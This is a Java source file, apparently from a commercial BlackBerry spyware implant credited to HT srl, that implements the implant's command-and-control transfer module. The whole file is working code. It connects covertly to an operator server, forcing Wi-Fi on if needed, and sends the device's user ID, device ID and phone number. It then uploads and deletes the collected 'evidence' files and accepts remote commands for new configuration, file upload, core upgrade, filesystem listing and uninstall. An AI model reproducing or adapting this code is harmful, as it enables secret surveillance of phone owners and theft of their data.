//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Transfer.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Random;
import java.util.Vector;

import javax.microedition.io.file.FileConnection;
import javax.microedition.io.file.FileSystemRegistry;

import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.Radio;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.action.Apn;
import blackberry.action.sync.Protocol;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceCollector;
import blackberry.evidence.EvidenceType;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Directory;
import blackberry.fs.Path;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class Transfer.
 */
public class Transfer {

    private static final int MAX_RECEIVE_LEN = 65536;
    /** The debug instance. */
    //#ifdef DEBUG
    protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);
    //#endif

    /** The Constant instance_. */
    private static Transfer instance = new Transfer();

    /**
     * Gets the single instance of Transfer.
     * 
     * @return single instance of Transfer
     */
    public static Transfer getInstance() {
        return instance;
    }

    private final EvidenceCollector evidenceCollector;

    private final Encryption crypto;
    private String host = "";

    private int port = 0;
    private boolean ssl;

    private boolean wifiForced;
    private boolean gprsAdmitted;
    private boolean wifiAdmitted;
    private Vector apns;

    private boolean connected = false;
    boolean activatedWifi = false;

    public boolean uninstall = false;
    public boolean reload = false;

    private Connection connection = null;
    private String url;

    /** The challenge. */
    byte[] challenge = new byte[16];

    /** The keys. */
    Keys keys;

    /**
     * Instantiates a new transfer.
     */
    protected Transfer() {
        evidenceCollector = EvidenceCollector.getInstance();
        keys = Keys.getInstance();
        crypto = new Encryption();
    }

    /**
     * @param deviceside
     *            == false : connessione via MDS deviceside == true :
     *            connessione diretta ref:
     *            http://na.blackberry.com/eng/developers
     *            /resources/Network_Tranports_tutorial.pdf
     * @return true if connected
     */
    protected boolean connect() {
        if (connected) {
            //#ifdef DEBUG
            debug.error("Already connected");
            //#endif

            //#ifdef DBC
            Check.asserts(connection != null, "connection null");
            //#endif
            return true;
        }

        if (wifiForced) {

            //#ifdef DEBUG
            debug.trace("connect: wifiForced");
            //#endif

            final int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            boolean ret = false;
            if (!active) {
                //#ifdef DEBUG
                debug.info("Activating Wifi");
                //#endif
                ret = Radio.activateWAFs(waf);
            } else {
                //#ifdef DEBUG
                debug.trace("connect: Wifi already active");
                //#endif
            }

            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            if (ret && active) {
                activatedWifi = true;
            }

            //#ifdef DEBUG
            debug.trace("wifiForced waf: " + waf + " active: " + active);
            //#endif

            //#ifdef DBC
            Check.asserts(wifiAdmitted = true,
                    "connect: wifiForced && !wifiAdmitted");
            //#endif
        }

        if (wifiAdmitted) {
            //#ifdef DEBUG
            debug.trace("Try wifi, ssl:" + ssl);
            //#endif

            connection = new WifiConnection(host, port, ssl);

            if (connection.isActive()) {
                //#ifdef DEBUG
                debug.trace("wifi connecting...");
                //#endif
                // /wifi = true;

                connected = connection.connect();

                //#ifdef DEBUG
                debug.trace("wifi connected: " + connected);
                if (connected) {
                    debug.info("Connected wifi, ssl:" + ssl);
                }
                //#endif
            } else {
                //#ifdef DEBUG
                debug.info("wifi not active");
                //#endif
            }
        }

        // fall back
        if (!connected && gprsAdmitted) {
            //#ifdef DEBUG
            debug.trace("Try direct tcp, ssl:" + ssl);
            //#endif
            // TODO: limit to the useful and actually working methods, ignore
            // apn

            for (int method = DirectTcpConnection.METHOD_DEVICE; method <= DirectTcpConnection.METHOD_NODEVICE; method++) {
                //#ifdef DEBUG
                debug.trace("method: " + method);
                //#endif
                connection = new DirectTcpConnection(host, port, ssl, method);
                connected = connection.connect();

                if (connected) {
                    //#ifdef DEBUG
                    debug.info("Connected tpc ssl:" + ssl + " method: "
                            + method);
                    //#endif
                    break;
                }
            }
        }

        // fall back
        if (!connected && apns != null) {
            for (int i = 0; i < apns.size(); i++) {
                final Apn apn = (Apn) apns.elementAt(i);
                //#ifdef DEBUG
                debug.trace("apn: " + apn);
                //#endif

                connection = new DirectTcpConnection(host, port, ssl, apn);
                connected = connection.connect();

                if (connected) {
                    //#ifdef DEBUG
                    debug.info("Connected tpc ssl:" + ssl + " apn: " + apn);
                    //#endif
                    break;
                }
            }
        }

        if (connection == null) {
            //#ifdef DEBUG
            debug.error("null connection");
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.info("connected: " + connected);
        url = connection.url;
        
        //#endif
        return connected;

    }

    /**
     * Disconnect.
     * 
     * @param sendbye
     *            the sendbye
     */
    protected final void disconnect(final boolean sendbye) {
        if (connected) {
            connected = false;
            if (sendbye) {
                sendCommand(Proto.BYE);
            }
            connection.disconnect();
            connection = null;
        }
        //#ifdef DEBUG
        debug.info("connected: " + connected);
        //#endif

        if (activatedWifi) {
            activatedWifi = false;
            final int waf = RadioInfo.getEnabledWAFs() & ~RadioInfo.WAF_WLAN;
            boolean active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            final boolean ret = false;
            if (active) {
                //#ifdef DEBUG
                debug.info("Deactivating Wifi");
                //#endif
                Radio.deactivateWAFs(waf);
            }

            active = (RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0;
            //#ifdef DEBUG
            debug.trace("deactivating wifiForced waf: " + waf + " active: "
                    + active);
            //#endif
        }
    }

    /**
     * Riceve un intero dalla rete che rappresenta la misura del payload per il
     * comando.
     * 
     * @param command
     *            the command
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void fillPayload(final Command command)
            throws ProtocolException {
        //#ifdef DBC
        Check.ensures(command != null, "command null");
        //#endif

        try {
            final byte[] buflen = connection.receive(4);
            final int len = Utils.byteArrayToInt(buflen, 0);

            //#ifdef DEBUG
            debug.trace("fillPayload len: " + len);
            //#endif

            sendCommand(Proto.OK);

            fillPayloadLen(command, len);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            throw new ProtocolException();
        }
    }

    /**
     * Riceve dati per la lunghezza specificata dalla connessione e li usa per
     * riempire il payload del command.
     * 
     * @param command
     *            the command
     * @param len
     *            the len
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void fillPayloadLen(final Command command, final int len)
            throws ProtocolException {
        //#ifdef DBC
        Check.ensures(command != null, "command null");
        //#endif
        //#ifdef DBC
        // Check.ensures(len > 0 && len < MAX_RECEIVE_LEN, "wrong len: " + len);
        //#endif

        try {
            command.payload = connection.receive(len);
            //#ifdef DEBUG
            debug.trace("filled with: " + command.payload.length);
            //#endif
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            throw new ProtocolException();
        }
    }

    /**
     * Gets the challenge.
     * 
     * @return the challenge
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getChallenge() throws ProtocolException {

        //#ifdef DEBUG
        debug.info("getChallenge");

        //#endif

        final Command command = recvCommand();

        if (command == null || command.id != Proto.CHALLENGE) {
            //#ifdef DEBUG
            debug.error("wrong challenge");
            //#endif
            throw new ProtocolException();
        }

        // e' arrivato il challange, leggo il contenuto
        if (command.id == Proto.CHALLENGE) {
            fillPayloadLen(command, 16);

            if (command.size() != 16) {
                //#ifdef DEBUG
                debug.error("getChallenge: expecting 16 bytes");
                //#endif
                throw new ProtocolException();
            }
            // ho 16 byte di challange, li cifro e li salvo
            challenge = crypto.encryptData(command.payload);

        } else {
            throw new ProtocolException();
        }
    }

    /**
     * prende la nuova configurazione e la salva, in modo che alla ripartenza.
     * 
     * @param command
     *            the command
     * @return the new conf
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getNewConf(final Command command)
            throws CommandException, ProtocolException {

        //#ifdef DEBUG
        debug.trace("getNewConf");
        //#endif

        fillPayload(command);
        if (command.size() > 0) {

            final boolean ret = Protocol.saveNewConf(command.payload, 0);
            if (!ret) {
                throw new CommandException(); //"write"
            } else {
                sendCommand(Proto.OK);
            }
        } else {
            throw new CommandException(); //"conf"
        }
    }

    /**
     * Receives and answers to a filesystem commands. The command is componed by
     * two parts: the path and the recursive depth.
     * 
     * @param command
     * @throws ProtocolException
     * @throws CommandException
     */
    private void sendFilesystem(Command command) throws ProtocolException,
            CommandException {
        String filefilter;

        //#ifdef DEBUG
        debug.trace("sendFilesystem");
        //#endif
        sendCommand(Proto.OK);

        //DEPTH
        int depth;

        try {
            final byte[] buffer = connection.receive(4);
            depth = Utils.byteArrayToInt(buffer, 0);
        } catch (IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            throw new ProtocolException();
        }
        //#ifdef DEBUG
        debug.trace("depth " + depth);
        //#endif
        sendCommand(Proto.OK);

        // PATH
        fillPayload(command);
        String path = WChar.getString(command.payload, true);
        //#ifdef DEBUG
        debug.trace("path " + path);
        //#endif
        sendCommand(Proto.OK);

        Protocol.saveFilesystem(depth, path);

        //#ifdef DEBUG
        debug.trace("end sendFilesystem");
        //#endif
    }

    /**
     * Send download.
     * 
     * @param command
     *            the command
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     */
    protected final void sendDownload(final Command command)
            throws CommandException, ProtocolException {

        String filefilter;

        //#ifdef DEBUG
        debug.trace("sendDownload");
        //#endif

        sendCommand(Proto.OK);
        fillPayload(command);

        if (command.size() <= 0) {
            throw new CommandException(); //"zero"
        }

        filefilter = WChar.getString(command.payload, true);


        // expanding $dir$
        filefilter = Directory.expandMacro(filefilter);
        filefilter = Protocol.normalizeFilename(filefilter);

        //#ifdef DEBUG
        debug.trace("downloading file: " + filefilter);
        //#endif

        Protocol.saveDownloadLog(filefilter);

        sendCommand(Proto.OK);
        //waitForOK();

        //#ifdef DEBUG
        debug.trace("END");
        //#endif
    }

    /**
     * Gets the upload.
     * 
     * @param command
     *            the command
     * @return the upload
     * @throws ProtocolException
     * @throws CommandException
     * @throws CommandException
     *             the command exception
     */
    protected final void getUpload(final Command command)
            throws ProtocolException, CommandException {
        String filename;
        //#ifdef DEBUG
        debug.trace("getUpload");
        //#endif

        sendCommand(Proto.OK);

        //#ifdef DEBUG
        debug.trace("fill name");
        //#endif
        fillPayload(command);

        if (command.size() <= 0) {
            throw new CommandException(); //"zero"
        }

        filename = WChar.getString(command.payload, true);
        //#ifdef DEBUG
        debug.trace("uploading file: " + Path.USER() + filename);
        //#endif

        sendCommand(Proto.OK);

        fillPayload(command);
        if (command.size() <= 0) {
            throw new CommandException(); //"zero"
        }

        //#ifdef DEBUG
        debug.trace("uploaded file: " + command.size());
        //#endif

        Protocol.saveUpload(filename, command.payload);

        sendCommand(Proto.OK);
    }

    /**
     * Gets the upgrade.
     * 
     * @param command
     *            the command
     * @return the upgrade
     * @throws CommandException
     *             the command exception
     * @throws ProtocolException
     */
    protected final void getUpgrade(final Command command)
            throws CommandException, ProtocolException {

        //#ifdef DEBUG
        debug.trace("getUpgrade");
        //#endif

        sendCommand(Proto.OK);

        //#ifdef DEBUG
        debug.trace("fill");
        //#endif
        fillPayload(command);
        if (command.size() > 0) {
            if (Protocol.upgrade(command.payload)) {
                sendCommand(Proto.OK);

            } else {
                throw new CommandException(); //Upgrade Core
            }

        } else {
            throw new CommandException(); //Empty core
        }

    }

    /**
     * Inits the.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param wifiPreferred_
     *            the wifi preferred_
     * @param gprs
     * @param apns
     */
    public final void initApn(final String host_, final int port_,
            final boolean ssl_, final boolean wifiForced, final boolean wifi,
            final boolean gprs, final Vector apns) {

        reload = false;
        uninstall = false;

        host = host_;
        port = port_;
        ssl = ssl_;
        this.wifiForced = wifiForced;
        wifiAdmitted = wifi;
        gprsAdmitted = gprs;
        this.apns = apns;
        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    public final void init(final String host_, final int port_,
            final boolean ssl_, final boolean wifiForced, final boolean wifi,
            final boolean gprs) {

        reload = false;
        uninstall = false;

        host = host_;
        port = port_;
        ssl = ssl_;
        this.wifiForced = wifiForced;
        wifiAdmitted = wifi;
        gprsAdmitted = gprs;

        apns = null;

        crypto.makeKey(Keys.getInstance().getChallengeKey());
    }

    /**
     * Parses the command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     * @throws ProtocolException
     *             the protocol exception
     */
    private final boolean parseCommand(final Command command)
            throws ProtocolException {
        //#ifdef DBC
        Check.asserts(command != null, "null command");
        //#endif

        try {

            switch (command.id) {
            case Proto.SYNC:
                //#ifdef DEBUG
                debug.info("SYNC");
                //#endif
                syncEvidences(command);
                break;

            case Proto.NEW_CONF:
                //#ifdef DEBUG
                debug.info("NEW_CONF");
                //#endif
                getNewConf(command);
                reload = true;
                break;

            case Proto.UNINSTALL:
                //#ifdef DEBUG
                debug.info("UNINSTALL");
                //#endif
                uninstall = true;
                sendCommand(Proto.OK);
                return false;

            case Proto.DOWNLOAD:
                //#ifdef DEBUG
                debug.info("DOWNLOAD");
                //#endif
                sendDownload(command);
                break;

            case Proto.UPLOAD:
                //#ifdef DEBUG
                debug.info("UPLOAD");
                //#endif
                getUpload(command);
                break;

            case Proto.UPGRADE:
                //#ifdef DEBUG
                debug.info("UPGRADE");
                //#endif
                getUpgrade(command);
                break;

            case Proto.FILESYSTEM:
                //#ifdef DEBUG
                debug.info("FILESYSTEM");
                //#endif
                sendFilesystem(command);
                break;

            case Proto.BYE:
                //#ifdef DEBUG
                debug.info("BYE");
                //#endif
                return false;

            default:
                break;
            }
        } catch (final CommandException ex) {
            //#ifdef DEBUG
            debug.warn("parseCommand exception:" + ex);
            //#endif
            sendCommand(Proto.NO);
        }

        return true;
    }

    /**
     * Recv command.
     * 
     * @return the command
     */
    protected final Command recvCommand() {
        //#ifdef DEBUG
        debug.trace("recvCommand");
        //#endif

        Command command = null;
        byte[] commandId;
        try {
            //#ifdef DBC
            Check.asserts(connection.isActive(),
                    "recvCommand connection not active");
            //#endif
            if (!connection.connected) {
                //#ifdef DEBUG
                debug.error("receiving command: disconnected");
                //#endif
                return null;
            }

            commandId = connection.receive(4);
            final int id = Utils.byteArrayToInt(commandId, 0);
            if (id != 0) {
                command = new Command(id, null);
            }
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("receiving command: " + e);
            //#endif
            return null;
        }

        //#ifdef DEBUG
        debug.trace("received command: " + command);

        //#endif
        return command;
    }

    /**
     * Send challenge.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendChallenge() throws ProtocolException {

        for (int i = 0; i < 16; i++) {
            challenge[i] = (byte) Utils.randomInt();
        }

        //#ifdef DEBUG
        debug.trace("sendChallenge: " + Utils.byteArrayToHex(challenge));
        //#endif   

        if (!sendCommand(Proto.CHALLENGE, challenge)) {
            throw new ProtocolException();
        }
    }

    /**
     * Gets the response.
     * 
     * @return the response
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void getResponse() throws ProtocolException {
        //#ifdef DEBUG
        debug.trace("getResponse");
        //#endif

        final Command command = recvCommand();
        // boolean exception = false;
        if (command == null || command.id != Proto.RESPONSE) {
            //#ifdef DEBUG
            debug.error("wrong response: ");
            //#endif
            throw new ProtocolException();
        }

        // e' arrivato il response, leggo il contenuto
        if (command.id == Proto.RESPONSE) {
            fillPayloadLen(command, 16);
            if (command.size() != 16) {
                throw new ProtocolException();
            }
            // ho 16 byte di response, lo confronto con il challange crittato
            final byte[] cryptoChallenge = crypto.encryptData(challenge);

            if (!Arrays.equals(cryptoChallenge, command.payload)) {
                //#ifdef DEBUG
                debug.trace("key: "
                        + Utils.byteArrayToHex(Keys.getInstance()
                                .getChallengeKey()));
                debug.trace("cryptoChallenge: "
                        + Utils.byteArrayToHex(cryptoChallenge));
                debug.trace("command.payload: "
                        + Utils.byteArrayToHex(command.payload));
                //#endif

                throw new ProtocolException();
            } else {
                //#ifdef DEBUG
                debug.info("Response OK");
                //#endif
                sendCommand(Proto.OK);
            }

        } else {
            throw new ProtocolException();
        }

    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     */
    protected final boolean sendCommand(final Command command) {
        //#ifdef DBC
        Check.requires(command != null, "null command");
        //#endif
        //#ifdef DEBUG
        debug.trace("sending command: " + command);
        //#endif

        final byte[] data = new byte[command.size() + 4];
        final DataBuffer databuffer = new DataBuffer(data, 0, data.length,
                false);

        databuffer.writeInt(command.id);
        if (command.payload != null) {

            databuffer.write(command.payload);
        } else {
            //#ifdef DEBUG
            debug.trace("payload null");
            //#endif
        }

        //#ifdef DBC
        Check.ensures(command.size() + 4 == data.length, "wrong length");
        //#endif

        try {
            return connection.send(data);
        } catch (final IOException e) {
            return false;
        }
    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @return true, if successful
     */
    protected final boolean sendCommand(final int command) {
        return sendCommand(new Command(command, null));
    }

    /**
     * Send command.
     * 
     * @param command
     *            the command
     * @param payload
     *            the payload
     * @return true, if successful
     */
    protected final boolean sendCommand(final int command, final byte[] payload) {
        return sendCommand(new Command(command, payload));
    }

    /**
     * Send crypto command.
     * 
     * @param commandId
     *            the command id
     * @param plain
     *            the plain
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendCryptoCommand(final int commandId,
            final byte[] plain) throws ProtocolException {

        sendManagedCommand(commandId, plain, true);

    }

    /**
     * Send ids.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendIds() throws ProtocolException {

        final Device device = Device.getInstance();
        device.refreshData();

        sendCryptoCommand(Proto.VERSION, Device.getVersion()); // 4
        sendCryptoCommand(Proto.SUBTYPE, Device.getSubtype()); // 2
        sendCryptoCommand(Proto.ID, keys.getBuildId()); // 16
        sendCryptoCommand(Proto.INSTANCE, keys.getInstanceId()); // 20

        sendCryptoCommand(Proto.USERID, device.getWUserId());
        sendCryptoCommand(Proto.DEVICEID, device.getWDeviceId());
        sendCryptoCommand(Proto.SOURCEID, device.getWPhoneNumber());

    }

    private void sendEvidences(final String basePath) throws ProtocolException {
        //#ifdef DEBUG
        debug.info("sendEvidences from: " + basePath);
        //#endif

        final Vector dirs = evidenceCollector.scanForDirLogs(basePath);
        final int dsize = dirs.size();
        //#ifdef DEBUG
        debug.trace("sendEvidences #directories: " + dsize);
        //#endif
        
        for (int i = 0; i < dsize; ++i) {
            final String dir = (String) dirs.elementAt(i);
            final Vector logs = evidenceCollector.scanForEvidences(basePath, dir);
            final int lsize = logs.size();
            //#ifdef DEBUG
            debug.trace("    dir: " + dir + " #evidences: " + lsize);
            //#endif
            for (int j = 0; j < lsize; ++j) {
                final String logName = (String) logs.elementAt(j); 
                final String fullLogName = basePath + dir + logName;
                final AutoFlashFile file = new AutoFlashFile(fullLogName, false);
                if (!file.exists()) {
                    //#ifdef DEBUG
                    debug.error("File doesn't exist: " + fullLogName);
                    //#endif
                    continue;
                }
                final byte[] content = file.read();
                //#ifdef DEBUG
                debug.info("Sending file: " + EvidenceCollector.decryptName(logName)
                        + " = " + fullLogName);
                //#endif

                final boolean ret = sendManagedCommand(Proto.LOG, content,
                        false);

                if (!ret) {
                    //#ifdef DEBUG
                    debug.error("cannot send file: " + fullLogName);
                    //#endif
                }
                evidenceCollector.remove(fullLogName);
            }
            if (!Path.removeDirectory(basePath + dir)) {
                //#ifdef DEBUG
                debug.warn("Not empty directory");
                //#endif
            }
        }
    }

    /**
     * Send managed command.
     * 
     * @param commandId
     *            the command id
     * @param plain
     *            the plain
     * @param cypher
     *            the cypher
     * @return true, if successful
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final boolean sendManagedCommand(final int commandId,
            final byte[] plain, final boolean cypher) throws ProtocolException {

        byte[] toSend;

        if (cypher) {
            //#ifdef DEBUG
            debug.trace("Sending Crypto Command: " + commandId);
            //#endif
            toSend = crypto.encryptData(plain);
        } else {
            //#ifdef DEBUG
            debug.trace("Sending Managed Command: " + commandId);
            //#endif
            toSend = plain;
        }

        sendCommand(commandId, Utils.intToByteArray(plain.length));
        final boolean ok = waitForOKorNO();
        if (!ok) {
            //#ifdef DEBUG
            debug.error("received a NO, maybe a log key error");
            //#endif
            return false;
        }

        boolean sent = false;
        try {
            //#ifdef DEBUG
            debug.trace("sending content");
            //#endif
            sent = connection.send(toSend);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e.toString());
            //#endif
        }

        if (!sent) {
            //#ifdef DEBUG
            debug.error("command not sent");
            //#endif
            throw new ProtocolException();
        }

        return waitForOKorNO();
    }

    /**
     * Send response.
     * 
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final void sendResponse() throws ProtocolException {
        //#ifdef DBC
        Check.requires(challenge != null, "null crypto challange");
        //#endif

        //#ifdef DEBUG
        debug.info("sendResponse");

        //#endif

        // challange contiene il challange cifrato, pronto per spedizione
        if (!sendCommand(Proto.RESPONSE, challenge)) {
            //#ifdef DEBUG
            debug.error("not sent response");
            //#endif
            throw new ProtocolException();
        }

        waitForOK();
    }

    /**
     * Send.
     * 
     * @return true, if successful
     */
    public final synchronized boolean startSession() {
        //#ifdef DEBUG
        debug.trace("startSession");
        //#endif
        try {
            if (!connect()) {
                //#ifdef DEBUG
                debug.error("not connected");
                //#endif
                return false;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("not connected: " + ex);
            //#endif
            return false;
        }

        boolean gotbye = false;
        try {
            // challenge response
            //#ifdef DEBUG
            debug.trace("ChallengeResponse ->");
            //#endif
            sendChallenge();
            getResponse();

            //#ifdef DEBUG
            debug.trace("ChallengeResponse <-");

            //#endif
            getChallenge();
            sendResponse();

            // identificazione
            //#ifdef DEBUG
            debug.trace("Ids");
            //#endif
            sendIds();

            // ricezione configurazione o comandi
            for (;;) {
                final Command command = recvCommand();
                //#ifdef DEBUG
                debug.info("Received command:" + command);
                //#endif

                if (command == null || !parseCommand(command)) {
                    //#ifdef DEBUG
                    debug.info("finished commands");
                    //#endif
                    break;
                }
            }
        } catch (final ProtocolException ex) {
            //#ifdef DEBUG
            debug.error("protocol exception");
            //#endif
            gotbye = ex.bye;
            return false;
        } finally {
            //#ifdef DEBUG
            debug.info("disconnect");
            //#endif
            disconnect(!gotbye);
        }

        //#ifdef DEBUG
        debug.info("done");

        //#endif
        return true;
    }

    /**
     * Sync logs.
     * 
     * @param command
     *            the command
     * @throws ProtocolException
     *             the protocol exception
     */
    protected final synchronized void syncEvidences(final Command command)
            throws ProtocolException {

        //#ifdef DEBUG
        debug.info("syncEvidences connected: " + connected);
        //#endif

        sendEvidences(Path.SD());
        sendEvidences(Path.USER());

        sendCommand(Proto.LOG_END);
        waitForOK();

        //#ifdef DEBUG
        debug.trace("syncEvidences: all logs sent");
        //#endif
    }

    private void waitForOK() throws ProtocolException {
        final Command ok = recvCommand();
        if (ok == null || ok.id != Proto.OK) {
            //#ifdef DEBUG
            if (ok != null) {
                debug.trace("received: " + ok.id);
            }
            //#endif
            //#ifdef DEBUG
            debug.error("waitForOK, not OK");
            //#endif
            throw new ProtocolException();
        }
    }

    private boolean waitForOKorNO() throws ProtocolException {
        final Command ok = recvCommand();
        if (ok == null) {
            //#ifdef DEBUG
            debug.error("waitForOKorNO: not OK");
            //#endif
            throw new ProtocolException();
        }

        switch (ok.id) {

        case Proto.OK:
            return true;

        case Proto.NO:
            return false;

        case Proto.BYE:
            //#ifdef DEBUG
            debug.warn("BYE");
            //#endif
            throw new ProtocolException(true);

        default:
            throw new ProtocolException();
        }

    }

    public String getUrl() {     
        return url;     
    }
}
